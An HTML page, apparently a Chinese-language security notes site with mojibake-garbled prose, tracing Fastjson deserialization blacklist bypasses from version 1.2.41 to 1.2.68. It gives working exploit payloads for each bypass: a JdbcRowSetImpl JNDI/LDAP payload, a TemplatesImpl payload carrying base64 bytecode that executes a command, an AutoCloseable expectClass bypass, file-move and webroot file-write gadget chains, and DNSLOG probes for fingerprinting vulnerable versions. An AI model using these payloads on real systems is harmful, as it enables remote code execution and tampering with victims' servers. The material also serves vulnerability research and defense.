<p>42ç‰ˆæœ¬ä¸­å¼€å‘äººå‘˜å°†æ˜æ–‡é»‘åå•æ”¹æˆäº†hashé»‘åå•ï¼Œå·²ç»æœ‰äººç¢°æ’å‡ºäº†ä¸å°‘ï¼Œæ„ä¹‰ä¸å¤§ï¼›åœ¨å¤„ç†25é»‘åå•ç»•è¿‡çš„æ—¶å€™åšäº†ä¸€ä¸ªæ ¡éªŒï¼Œå¦‚æœç±»åä»¥<code>L</code>å¼€å¤´ï¼Œ<code>;</code>ç»“å°¾ï¼Œåˆ™ä¼šç”¨stubstringå¤„ç†ä¸€ä¸‹(è¿™ä¸ªåˆ¤æ–­æ˜¯ç”±HASHæ¥åˆ¤æ–­çš„ï¼Œçœ‹ä¸æ‡‚ï¼Œä½†æˆ‘å¤§å—éœ‡æ’¼ï¼‰ï¼š</p>
<pre><code class="language-text">if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {
    className = className.substring(1, className.length() - 1);
}
</code></pre>
<h4 id="bypass">bypassï¼ˆåŒå†™ç»•è¿‡ï¼‰</h4>
<p>é‚£ä¹ˆç›´æ¥ä¸€æ‰‹åŒå†™ç»•è¿‡</p>
<pre><code class="language-text">{
    &quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,
    &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:2357/Command8&quot;,
    &quot;autoCommit&quot;:true
}
</code></pre>
<h3 id="1242_1">1.2.42</h3>
<h4 id="_5">æ›´æ–°æœºåˆ¶</h4>
<p>é’ˆå¯¹åŒå†™ç»•è¿‡å¥—äº†ä¸ªå­åˆ¤æ–­ã€‚</p>
<pre><code class="language-text">if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {
                if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L == 655656408941810501L) {
                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
                }

                className = className.substring(1, className.length() - 1);
            }
</code></pre>
<h4 id="bypass_1">Bypass</h4>
<p>TypeUtils.loadClass ä¸­é™¤äº†å¯¹L;è¿›è¡Œåˆ¤æ–­ï¼Œè¿˜æœ‰å¯¹[è¿›è¡Œäº†åˆ¤æ–­</p>
<pre><code class="language-text">} else if (className.charAt(0) == '[') {
    Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);
    return Array.newInstance(componentType, 0).getClass();
} 
</code></pre>
<p>å›´ç»•è¿™ä¸ªå±•å¼€ï¼Œæ„é€ å¦‚ä¸‹payloadï¼Œå…·ä½“ä¸ºå•¥è¿™ä¹ˆæ„é€ æ²¡æœ‰ç»†è·Ÿï¼Œåæ­£è·Ÿ[æœ‰å…³</p>
<pre><code class="language-text">{
  &quot;@type&quot; : &quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;[,{
  &quot;_bytecodes&quot; : [&quot;yv66vgAAADQAPQoADQAcCQAdAB4IAB8KACAAIQcAIggAIwoAJAAlCgAkACYKACcAKAcAKQoACgAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwADgAPBwAuDAAvADABAAVQd25lZAcAMQwAMgAzAQAQamF2YS9sYW5nL1N0cmluZwEABGNhbGMHADQMADUANgwANwA4BwA5DAA6ADsBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAA8AA8BABJ0ZXN0X2Zhc3Rqc29uL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA2VycgEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEAB3dhaXRGb3IBAAMoKUkBAA9wcmludFN0YWNrVHJhY2UAIQAMAA0AAAAAAAQAAQAOAA8AAQAQAAAAHQABAAEAAAAFKrcAAbEAAAABABEAAAAGAAEAAAAJAAEAEgATAAIAEAAAABkAAAADAAAAAbEAAAABABEAAAAGAAEAAAAXABQAAAAEAAEAFQABABIAFgACABAAAAAZAAAABAAAAAGxAAAAAQARAAAABgABAAAAHAAUAAAABAABABUACAAXAA8AAQAQAAAAawAEAAEAAAAmsgACEgO2AAQEvQAFWQMSBlNLuAAHKrYACLYACVenAAhLKrYAC7EAAQAIAB0AIAAKAAIAEQAAAB4ABwAAAAsACAANABIADgAdABEAIAAPACEAEAAlABIAGAAAAAcAAmAHABkEAAEAGgAAAAIAGw&quot;],
  &quot;_name&quot; : &quot;a&quot;,
  &quot;_tfactory&quot; : {},
  &quot;outputProperties&quot; : {}
}
</code></pre>
<h3 id="1244">1.2.44</h3>
<h4 id="_6">æ›´æ–°æœºåˆ¶</h4>
<p>44ç‰ˆæœ¬é’ˆå¯¹43ç‰ˆæœ¬çš„ç»•è¿‡ä½œäº†å¤„ç†ï¼Œ[ å¼€å¤´æˆ–è€… L å¼€å¤´ ; ç»“å°¾éƒ½ä¼šæŠ›å‡ºå¼‚å¸¸</p>
<p><img alt="image-20210907182521116" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907182521116.png" title="image-20210907182521116" /></p>
<h4 id="bypass_2">Bypass</h4>
<p>JSONå†…ç½®å®Œç¾å‡»ç ´</p>
<h3 id="1247-67">1.2.47-67</h3>
<h4 id="_7">æ›´æ–°æœºåˆ¶</h4>
<p>ç”±äº47ä¿®å¤äº†JSONå†…ç½®ç»•è¿‡ï¼Œè¿™äº›ç‰ˆæœ¬é‡Œä¹Ÿæ²¡å•¥å¾ˆå¥½çš„ç»•è¿‡æ–¹æ³•ï¼Œç½‘ä¸Šå¤šæ˜¯ä»é»‘åå•ä¸­ç»“åˆJNDIæ³¨å…¥æ‰¾æ¼ç½‘ä¹‹é±¼ï¼ˆæ‰¾åˆ°çš„å¤šä¸ºç»„ä»¶ç±»ï¼Œéœ€è¦ç›®æ ‡æœºå™¨ä¸Šæœ‰è¯¥ç»„ä»¶æ‰èƒ½æ‰“<a href="https://paper.seebug.org/1155/ï¼‰ä»¥åŠexpectClassç»•è¿‡AutoType" title="https://paper.seebug.org/1155/ï¼‰ä»¥åŠexpectClassç»•è¿‡AutoType">https://paper.seebug.org/1155/ï¼‰ä»¥åŠexpectClassç»•è¿‡AutoType</a></p>
<h3 id="1268">1.2.68</h3>
<p>68ç‰ˆæœ¬ä¹‹åå‡ºç°äº†æ–°çš„å®‰å…¨æ§åˆ¶ç‚¹safeModeï¼Œå¦‚æœå¼€å¯ï¼Œåœ¨checkAtuoTypeçš„æ—¶å€™ä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œåªè¦è®¾ç½®@typeç±»å‹ï¼Œæƒ³ååºåˆ—åŒ–æŒ‡å®šç±»å¯¹è±¡çš„æ—¶å€™ï¼Œå°±ä¼šæŠ›å¼‚å¸¸ï¼Œä¹Ÿå°±æ˜¯è¯´å¼€äº†safemodçš„ç«™å¯ä»¥ä¸ç”¨çœ‹äº†ã€‚
å½“ç„¶è¿™ä¸ªç‰ˆæœ¬expectClassç»•è¿‡AutoTypeæ˜¯å¯ä»¥æ‰“ä¸€æ‰“çš„ã€‚</p>
<h4 id="bypass-expectclassautotype-1268">Bypass expectClassç»•è¿‡AutoType  &lt;=1.2.68</h4>
<p>è¿™é‡Œé€šè¿‡ä¸€ä¸ªdemoå±•ç¤ºä¸€ä¸‹.</p>
<pre><code class="language-text">package org.example;

import java.io.IOException;

public class VulAutoCloseable implements AutoCloseable {
    public VulAutoCloseable(){
        try {
            Runtime.getRuntime().exec(&quot;calc&quot;);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void close() throws Exception {

    }
}
</code></pre>
<p>ç„¶åæˆ‘ä»¬çš„payload</p>
<pre><code class="language-text">public class evil {
        public static void main(String[] args){
            System.out.println(JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.example.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;}\n&quot;));
        }
    }
</code></pre>
<p>æ‰§è¡Œåå¼¹è®¡ç®—å™¨</p>
<p><img alt="image-20210907204915990" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907204915990.png" title="image-20210907204915990" /></p>
<p>æˆ‘ä»¬é€šè¿‡è°ƒè¯•æ¥çœ‹çœ‹å…·ä½“æ˜¯æ€ä¹ˆä¸ªå›äº‹</p>
<h4 id="_8">è°ƒè¯•</h4>
<p>äºcheckautotype å¤„ä¸‹æ–­ç‚¹ã€‚</p>
<p><img alt="image-20210907224439952" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907224439952.png" title="image-20210907224439952" /></p>
<p>å¯ä»¥å‘ç°ä¼ å…¥çš„typenameæ˜¯ AutoCloseableã€‚æ­¤æ—¶çš„expectClassæ˜¯NULL</p>
<p>å¾€ä¸‹ï¼Œç›´æ¥ä»ç¼“å­˜Mappingå¯ä»¥ç›´æ¥è·å¾—æ­¤ç±»ï¼Œ</p>
<p><img alt="image-20210907224744679" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907224744679.png" title="image-20210907224744679" /></p>
<p>ç„¶åç›´æ¥è¢«returnäº†ï¼Œç”šè‡³æ²¡æœ‰èµ°autoTypeSupportæ ¡éªŒã€‚</p>
<p><img alt="image-20210907225106968" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907225106968.png" title="image-20210907225106968" /></p>
<p>clazzè¢«returnåˆ°äº†defaultjsonparseré‡Œï¼Œå¾€ä¸‹çœ‹é€»è¾‘å¯ä»¥å‘ç°ä»å¯¹clazzè¿›è¡Œäº†ä¸€ä¸ªdeserialzeæ–¹æ³•ï¼Œè·Ÿè¿›</p>
<p><img alt="image-20210907225448517" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907225448517.png" title="image-20210907225448517" /></p>
<p>ä¼šè·Ÿåˆ°è¿™é‡Œæ¥</p>
<p><img alt="image-20210908010408177" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908010408177.png" title="image-20210908010408177" /></p>
<p>å¾€ä¸‹çœ‹ï¼Œä¼šå› ä¸ºç”±Autocloseableä¸èƒ½é€šè¿‡getSeeAlsoæ–¹æ³•æˆåŠŸç”Ÿæˆdeserializerå¯¹è±¡ï¼Œä»è€Œè§¦å‘ç¬¬äºŒè½®checkAutoType</p>
<p><img alt="image-20210908013610732" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908013610732.png" title="image-20210908013610732" /></p>
<p>ç¬¬äºŒè½®ä¼ å…¥checkAutoTypeçš„å‚æ•°ä¾æ¬¡ä¸º ç¬¬äºŒä¸ª@typeå€¼ï¼Œç¬¬ä¸€ä¸ª@typeå€¼ï¼Œå’Œä¸€ä¸ªä¸é‡è¦çš„lexer.getFeatures()</p>
<p>è¿›æ¥checkAutoTypeåï¼Œä¼šå…ˆå¯¹exceptclassè¿›è¡Œç™½åå•æ ¡éªŒï¼ŒAutocloseableç±»è‡ªç„¶æ˜¯éšä¾¿è¿‡æ‰ï¼Œç„¶åä½¿exceptClassFlagç½®ä¸ºtrue</p>
<p><img alt="image-20210908013751407" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908013751407.png" title="image-20210908013751407" /></p>
<p>éšåä¾¿æ˜¯ä¸€äº›å¯¹typenameçš„é»‘ç™½åå•æ ¡éªŒï¼Œç”±äºtypenameæ˜¯org.example.VulAutoCloseableï¼Œä¸åœ¨é»‘ç™½åå•ä¸­ï¼Œæ‰€ä»¥æ ¡éªŒè‡ªç„¶éƒ½é€šè¿‡äº†ã€‚
ä»¥ä¸‹æ˜¯ä¾æ¬¡çš„æ ¡éªŒé¡ºåº</p>
<p>é»‘åå•æ ¡éªŒ</p>
<p><img alt="image-20210908014110837" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908014110837.png" title="image-20210908014110837" /></p>
<p>å…ˆç™½åé»‘ï¼Œå…¶ä¸­æ‰€æœ‰çš„Array.binarySearchç»“æœéƒ½æ˜¯0ï¼Œè‡ªç„¶å°±èƒ½é€šè¿‡IFæ¡ä»¶</p>
<p><img alt="image-20210908014001405" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908014001405.png" title="image-20210908014001405" /></p>
<p>å…ˆé»‘åç™½</p>
<p><img alt="image-20210908014440625" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908014440625.png" title="image-20210908014440625" /></p>
<p>å†²ç ´é‡é‡è€ƒç ”ï¼ŒtypenameæŒ‡å®šç±»è¢«ä¼ å…¥TypeUtils.loadClass,è·Ÿè¿›</p>
<p><img alt="image-20210908014625797" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908014625797.png" title="image-20210908014625797" /></p>
<p>ä¼šæ¥åˆ°è¿™é‡Œï¼ŒVulAutoCloseableçš„ç±»å¯¹è±¡è¢«è¿”å›</p>
<p><img alt="image-20210908015237563" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908015237563.png" title="image-20210908015237563" /></p>
<p>ç„¶åä¼šå¯¹è¿™ä¸ªç±»å¯¹è±¡è¿›è¡Œæ ¡éªŒï¼Œæ ¡éªŒæ˜¯å¦ä¸ºClassLoaderã€DataSourceã€RowSetç­‰ç±»çš„å­ç±»ï¼Œæ˜¯çš„è¯ç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œè¿™ä¹Ÿæ˜¯è¿‡æ»¤å¤§å¤šæ•°JNDIæ³¨å…¥Gadgetçš„æœºåˆ¶ï¼š</p>
<p><img alt="image-20210908015331781" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908015331781.png" title="image-20210908015331781" /></p>
<p>ç„¶ååˆ¤æ–­clazzæ˜¯å¦æ˜¯exceptClassçš„å­ç±»ï¼Œæ˜¯çš„è¯å°±ç›´æ¥è¿”å›ç±»å¯¹è±¡ã€‚ç±»å¯¹è±¡è¢«è¿”å›åï¼Œå°±ä¼šè¿›å…¥è¢«ååºåˆ—åŒ–çš„ä¸‹ä¸€ä¸ªè¿‡ç¨‹ï¼Œå®ƒçš„æ„é€ æ–¹æ³•ç­‰ä¼šè¢«è°ƒç”¨ï¼Œä»è€Œå®Œæˆåˆ©ç”¨ã€‚</p>
<p><img alt="image-20210908015543198" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908015543198.png" title="image-20210908015543198" /></p>
<h4 id="gadget">å®æˆ˜Gadget</h4>
<p>å®æˆ˜ä¸­ç”¨çš„payload:</p>
<p>æ–‡ä»¶ç§»åŠ¨ï¼šå°†ä¸€ä¸ªæ–‡ä»¶ä¸­çš„å†…å®¹ç§»åŠ¨åˆ°æ–°çš„ä¸€ä¸ªæ–‡ä»¶ä¸­å»ï¼ŒåŸæ¥æ–‡ä»¶çš„å†…å®¹æ¶ˆå¤±ã€‚</p>
<pre><code class="language-text">&lt;dependency&gt;    &lt;groupId&gt;org.aspectj&lt;/groupId&gt;    &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;    &lt;version&gt;1.9.5&lt;/version&gt;&lt;/dependency&gt;
</code></pre>
<pre><code class="language-text">{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;, &quot;tempPath&quot;:&quot;D:/b.txt&quot;, &quot;targetPath&quot;:&quot;E:/b.txt&quot;}
</code></pre>
<p>æ–‡ä»¶å†™å…¥</p>
<pre><code class="language-text">&lt;dependency&gt;
  &lt;groupId&gt;com.sleepycat&lt;/groupId&gt;
  &lt;artifactId&gt;je&lt;/artifactId&gt;
  &lt;version&gt;5.0.73&lt;/version&gt;
&lt;/dependency&gt;

&lt;dependency&gt;
  &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;
  &lt;artifactId&gt;kryo&lt;/artifactId&gt;
  &lt;version&gt;4.0.0&lt;/version&gt;
&lt;/dependency&gt;

&lt;dependency&gt;
  &lt;groupId&gt;org.aspectj&lt;/groupId&gt;
  &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;
  &lt;version&gt;1.9.5&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<pre><code class="language-text">{
    &quot;stream&quot;: {
        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
        &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;,
        &quot;targetPath&quot;: &quot;D:/wamp64/www/hacked.txt&quot;, \\åˆ›å»ºä¸€ä¸ªç©ºæ–‡ä»¶
        &quot;tempPath&quot;: &quot;D:/wamp64/www/test.txt&quot;\\åˆ›å»ºä¸€ä¸ªæœ‰å†…å®¹çš„æ–‡ä»¶
    },
    &quot;writer&quot;: {
        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
        &quot;@type&quot;: &quot;com.esotericsoftware.kryo.io.Output&quot;,
        &quot;buffer&quot;: &quot;cHduZWQ=&quot;, \\base64åçš„æ–‡ä»¶å†…å®¹
        &quot;outputStream&quot;: {
            &quot;$ref&quot;: &quot;$.stream&quot;
        },
        &quot;position&quot;: 5
    },
    &quot;close&quot;: {
        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
        &quot;@type&quot;: &quot;com.sleepycat.bind.serial.SerialOutput&quot;,
        &quot;out&quot;: {
            &quot;$ref&quot;: &quot;$.writer&quot;
        }
    }
}
</code></pre>
<h2 id="_9">æ¼æ´æ£€æµ‹</h2>
<h4 id="dnslog">DNSLOG</h4>
<pre><code class="language-text">{&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog.cn&quot;} åœ¨49ä»¥ä¸‹æ‰èƒ½è§¦å‘ï¼Œå› ä¸ºè¿™ä¸ªgadgetåœ¨49è¢«ç¦æ­¢äº†ï¼Œå¯ç”¨äºæ£€æµ‹å…·ä½“ç‰ˆæœ¬
{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}
{&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}
{&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;}}
{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, {&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;}}&quot;&quot;}
{{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;}:&quot;aaa&quot;}
Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;}]
Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;}
{{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;}:0
</code></pre>
<h4 id="_10">æŠ¥é”™æ£€æµ‹</h4>
<p>è¿æ°”å¥½å¯ä»¥ç›´æ¥å‡ºç‰ˆæœ¬å·</p>
<pre><code class="language-text">{&quot;xxx&quot;:&quot;\x+(eyJhIjoiXHgaGiJ9çš„base64è§£ç ) 
åœ¨60ä»¥ä¸‹æ‰èƒ½è§¦å‘ï¼Œå½“åç«¯ Fastjson ç‰ˆæœ¬å°äº 1.2.60 æ—¶ï¼Œä½¿ç”¨è¯¥è¯·æ±‚åŒ…ä¸ä¼šå»¶æ—¶ä¸ä¼šæŠ¥é”™ï¼Œåä¹‹åˆ™ä¼šå»¶è¿Ÿæˆ–æŠ¥é”™
</code></pre>
<h4 id="_11">ç»•è¿‡å¼‚å¸¸</h4>
<p>æœ‰äº›å¼€å‘äººå‘˜åœ¨å†™è§£æJSONçš„ç›¸å…³ä»£ç æ—¶ï¼Œå¯èƒ½ä¼šè®¾ç½®åªèƒ½ä¼ å…¥æŒ‡å®šå¯¹è±¡ã€‚
è€Œæˆ‘ä»¬é€šè¿‡è®¾ç½®@typeæ—¶ä¼ å…¥çš„å¯¹è±¡å¯èƒ½ä¼šä¸æŒ‡å®šå¯¹è±¡ä¸åŒ¹é…ä»è€Œå‘ç”Ÿtype not matchçš„å¼‚å¸¸ã€‚</p>
<p>è§£å†³åŠæ³•æ˜¯è¿™æ ·,æœ€å¤–å±‚å¥—å±‚å¯¹è±¡</p>
<pre><code class="language-text">{
&quot;xxx&quot;: {&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog&quot;}
}
</code></pre>
<h2 id="_12">å®¡è®¡å…³é”®å­—</h2>
<p>JSON.parseObject(</p>
<h2 id="_13">å‚è€ƒ</h2>
<p><a href="https://c014.cn/pdfs/java/Fastjson/Fastjsonååºåˆ—åŒ–æ¼æ´.html" title="https://c014.cn/pdfs/java/Fastjson/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">https://c014.cn/pdfs/java/Fastjson/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html</a></p>
<p><a href="https://www.freebuf.com/vuls/228099.html" title="https://www.freebuf.com/vuls/228099.html">https://www.freebuf.com/vuls/228099.html</a></p>
<p><a href="https://aluvion.gitee.io/2020/08/23/Fastjsonååºåˆ—åŒ–æœºåˆ¶å’Œautotypeè§‚æµ‹/#1-2-25-lt-Fastjson-lt-1-2-41-checkAutoType-é»‘åå•ç»•è¿‡" title="https://aluvion.gitee.io/2020/08/23/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E5%92%8Cautotype%E8%A7%82%E6%B5%8B/#1-2-25-lt-Fastjson-lt-1-2-41-checkAutoType-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87">https://aluvion.gitee.io/2020/08/23/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E5%92%8Cautotype%E8%A7%82%E6%B5%8B/#1-2-25-lt-Fastjson-lt-1-2-41-checkAutoType-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87</a></p>
<p><a href="https://paper.seebug.org/1192/#1225" title="https://paper.seebug.org/1192/#1225">https://paper.seebug.org/1192/#1225</a></p>
<p><a href="https://www.mi1k7ea.com/2019/11/11/Fastjsonç³»åˆ—å››â€”â€”1-2-25-1-2-47ååºåˆ—åŒ–æ¼æ´ï¼ˆæ— éœ€å¼€å¯AutoTypeï¼‰/#ä¸å—AutoTypeSupportå½±å“çš„ç‰ˆæœ¬" title="https://www.mi1k7ea.com/2019/11/11/Fastjson%E7%B3%BB%E5%88%97%E5%9B%9B%E2%80%94%E2%80%941-2-25-1-2-47%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%97%A0%E9%9C%80%E5%BC%80%E5%90%AFAutoType%EF%BC%89/#%E4%B8%8D%E5%8F%97AutoTypeSupport%E5%BD%B1%E5%93%8D%E7%9A%84%E7%89%88%E6%9C%AC">https://www.mi1k7ea.com/2019/11/11/Fastjson%E7%B3%BB%E5%88%97%E5%9B%9B%E2%80%94%E2%80%941-2-25-1-2-47%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%97%A0%E9%9C%80%E5%BC%80%E5%90%AFAutoType%EF%BC%89/#%E4%B8%8D%E5%8F%97AutoTypeSupport%E5%BD%B1%E5%93%8D%E7%9A%84%E7%89%88%E6%9C%AC</a></p>
<p><a href="https://www.mi1k7ea.com/2021/02/08/Fastjsonç³»åˆ—å…­â€”â€”1-2-48-1-2-68ååºåˆ—åŒ–æ¼æ´/#0x04-1-2-68ååºåˆ—åŒ–æ¼æ´ï¼ˆexpectClassç»•è¿‡AutoTypeï¼‰" title="https://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x04-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88expectClass%E7%BB%95%E8%BF%87AutoType%EF%BC%89">https://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x04-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88expectClass%E7%BB%95%E8%BF%87AutoType%EF%BC%89</a></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
        è¡¨è¾¾å¼æ³¨å…¥
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="btn btn-xs btn-link">
        xstream ååºåˆ—åŒ–
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="container-fluid wm-page-content">
  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
</footer>

</body>
</html>